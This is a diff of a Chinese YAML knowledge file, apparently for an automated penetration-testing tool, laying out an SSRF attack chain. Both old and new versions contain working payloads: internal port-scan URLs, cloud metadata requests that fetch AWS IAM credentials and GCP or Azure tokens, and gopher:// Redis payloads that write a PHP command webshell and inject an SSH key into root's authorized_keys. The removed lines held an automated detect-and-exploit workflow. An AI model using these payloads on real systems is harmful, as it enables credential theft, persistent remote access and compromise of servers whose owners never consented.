@@ -1,122 +1,20 @@
-name: "服务端请求伪造"
-description: "SSRF漏洞利用和内网探测技术"
-domain: "web"
-version: "1.0"
+name: 服务端请求伪造
+description: SSRF漏洞利用和内网探测技术
+domain: web
+version: '1.0'
 tags:
-  - web
-  - ssrf
-  - internal
-
-knowledge: |
-  # SSRF攻击链
-  
-  ## 基础探测 → 内网漫游
-  
-  ### 1. 探测SSRF
-  
-  ```
-  ?url=http://127.0.0.1:22
-  ?url=http://127.0.0.1:3306
-  ```
-  
-  ### 2. 内网端口扫描
-  
-  ```
-  ?url=http://192.168.1.1:80
-  ?url=http://192.168.1.1:443
-  ?url=http://192.168.1.1:22
-  ?url=http://192.168.1.1:3306
-  ```
-  
-  ---
-  
-  ## 云元数据获取链
-  
-  ### AWS利用
-  
-  ```
-  1. 探测元数据端点
-     http://169.254.169.254/latest/meta-data/
-  
-  2. 获取IAM凭证
-     http://169.254.169.254/latest/meta-data/iam/security-credentials/
-  
-  3. 利用凭证横向移动
-  ```
-  
-  ### GCP利用
-  
-  ```
-  1. 探测元数据端点
-     http://metadata.google.internal/computeMetadata/v1/
-  
-  2. 获取服务账号令牌
-     http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-  ```
-  
-  ### Azure利用
-  
-  ```
-  1. 探测元数据端点
-     http://169.254.169.254/metadata/instance?api-version=2021-02-01
-  
-  2. 获取访问令牌
-  ```
-  
-  ---
-  
-  ## Redis攻击链
-  
-  ### 1. 探测Redis
-  
-  ```
-  ?url=gopher://127.0.0.1:6379/_INFO
-  ```
-  
-  ### 2. 写WebShell
-  
-  ```
-  gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0A_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0A_CONFIG%20SET%20dbfilename%20shell.php%0D%0A_SAVE
-  ```
-  
-  ### 3. 写入SSH公钥
-  
-  ```
-  gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Froot%2F.ssh%0D%0A_CONFIG%20SET%20dbfilename%20authorized_keys%0D%0A_SET%20sshkey%20%22ssh-rsa%20AAAAB...%22%0D%0A_SAVE
-  ```
-  
-  ---
-  
-  ## 攻击链汇总
-  
-  | 目标 | Payload | 说明 |
-  |------|---------|------|
-  | 内网探测 | `?url=http://192.168.x.x:port` | 端口扫描 |
-  | AWS元数据 | `?url=http://169.254.169.254/latest/meta-data/` | 获取凭证 |
-  | Redis写Shell | `gopher://127.0.0.1:6379/...` | 写入WebShell |
-  | MySQL | `gopher://127.0.0.1:3306/...` | 数据库攻击 |
-  
-
-workflows:
-  - name: "自动检测和利用"
-    description: "自动检测漏洞并尝试利用"
-    steps:
-      - description: "信息收集和漏洞探测"
-        expected_output: "发现潜在漏洞点"
-      - description: "漏洞验证"
-        expected_output: "确认漏洞存在"
-      - description: "漏洞利用"
-        expected_output: "成功利用漏洞"
-
-tool_preferences:
-  nmap:
-    score: 0.8
-    reason: "端口和服务扫描"
-  nuclei:
-    score: 0.9
-    reason: "漏洞扫描"
-
-examples:
-  - scenario: "发现漏洞并获取敏感信息"
-    solution: "使用工具探测 -> 验证漏洞 -> 获取数据"
-    tools_used: ["nmap", "nuclei"]
+- web
+- ssrf
+- internal
+knowledge: "# SSRF攻击链\n\n## 基础探测 → 内网漫游\n\n### 1. 探测SSRF\n\n```\n?url=http://127.0.0.1:22\n?url=http://127.0.0.1:3306\n```\n\
+  \n### 2. 内网端口扫描\n\n```\n?url=http://192.168.1.1:80\n?url=http://192.168.1.1:443\n?url=http://192.168.1.1:22\n?url=http://192.168.1.1:3306\n\
+  ```\n\n---\n\n## 云元数据获取链\n\n### AWS利用\n\n```\n1. 探测元数据端点\n   http://169.254.169.254/latest/meta-data/\n\n2. 获取IAM凭证\n  \
+  \ http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n3. 利用凭证横向移动\n```\n\n### GCP利用\n\n```\n1. 探测元数据端点\n\
+  \   http://metadata.google.internal/computeMetadata/v1/\n\n2. 获取服务账号令牌\n   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n\
+  ```\n\n### Azure利用\n\n```\n1. 探测元数据端点\n   http://169.254.169.254/metadata/instance?api-version=2021-02-01\n\n2. 获取访问令牌\n\
+  ```\n\n---\n\n## Redis攻击链\n\n### 1. 探测Redis\n\n```\n?url=gopher://127.0.0.1:6379/_INFO\n```\n\n### 2. 写WebShell\n\n```\n\
+  gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0A_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0A_CONFIG%20SET%20dbfilename%20shell.php%0D%0A_SAVE\n\
+  ```\n\n### 3. 写入SSH公钥\n\n```\ngopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Froot%2F.ssh%0D%0A_CONFIG%20SET%20dbfilename%20authorized_keys%0D%0A_SET%20sshkey%20%22ssh-rsa%20AAAAB...%22%0D%0A_SAVE\n\
+  ```\n\n---\n\n## 攻击链汇总\n\n| 目标 | Payload | 说明 |\n|------|---------|------|\n| 内网探测 | `?url=http://192.168.x.x:port` | 端口扫描\
+  \ |\n| AWS元数据 | `?url=http://169.254.169.254/latest/meta-data/` | 获取凭证 |\n| Redis写Shell | `gopher://127.0.0.1:6379/...`\
+  \ | 写入WebShell |\n| MySQL | `gopher://127.0.0.1:3306/...` | 数据库攻击 |\n"
